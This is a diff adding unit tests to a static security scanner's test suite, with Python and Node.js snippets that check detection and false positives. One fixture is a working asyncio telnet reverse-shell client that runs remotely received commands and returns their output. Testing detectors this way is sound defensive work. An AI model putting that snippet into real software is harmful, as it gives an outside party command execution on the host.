@@ -146,6 +146,59 @@ describe("Node.js scanning", () => {
       expect(result.findings.some((finding) => finding.category === category)).toBe(true);
     }
   });
+
+  it("detects an asyncio reverse-shell style telnet client", () => {
+    const result = scanPython(`
+import asyncio
+import telnetlib3
+
+async def shell(reader, writer):
+    command = await reader.read(1024)
+    process = await asyncio.create_subprocess_shell(command)
+    output, _ = await process.communicate()
+    writer.write(output.decode())
+
+telnetlib3.open_connection(host, port, shell=shell)
+`);
+    for (const category of [
+      "network_egress",
+      "dynamic_execution",
+      "interpreter_escape",
+      "data_exfiltration",
+    ] as const) {
+      expect(result.findings.some((finding) => finding.category === category)).toBe(true);
+    }
+  });
+
+  it("does not treat ordinary Python in-memory writes as exfiltration", () => {
+    const result = scanPython(`
+from io import StringIO
+buffer = StringIO()
+buffer.write("local report")
+`);
+    expect(result.findings.some((finding) => finding.category === "data_exfiltration")).toBe(false);
+  });
+
+  it("detects a relative Node.js download wrapper with a URL argument", () => {
+    const result = scanJavaScript(`
+const { download } = require('./download')
+await download(gyp, release.tarballUrl)
+`);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "javascript.network.download-wrapper",
+        category: "network_egress",
+      }),
+    ]));
+  });
+
+  it("does not classify a local download helper without a URL argument as network", () => {
+    const result = scanJavaScript(`
+const { download } = require('./download')
+await download(targetPath)
+`);
+    expect(result.findings.some((finding) => finding.category === "network_egress")).toBe(false);
+  });
 });
 
 describe("embedded interpreter payloads", () => {
